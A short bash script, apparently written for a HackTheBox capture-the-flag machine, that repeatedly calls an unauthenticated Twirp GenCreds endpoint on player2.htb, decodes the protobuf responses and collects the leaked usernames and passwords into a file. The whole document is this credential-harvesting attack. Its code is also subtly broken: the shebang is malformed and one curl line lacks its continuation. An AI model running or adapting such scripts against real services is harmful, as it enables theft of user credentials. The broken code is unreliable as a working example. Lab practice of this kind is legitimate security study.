#/usr/env/bash
echo "Finding Credentials..."
for i in `seq 1 100`
do
curl -s -X POST -H "Content-Type: application/protobuf"
http://player2.htb:8545/twirp/twirp.player2.auth.Auth/GenCreds \
| ./bin/protoc -I . --decode twirp.player2.auth.Creds generated.proto \
| tr '\n' ' ' >> userpass.txt
echo >> userpass.txt
done
echo "Unique Credentials:"
gawk -i inplace '!a[$0]++' userpass.txt
cat userpass.txt
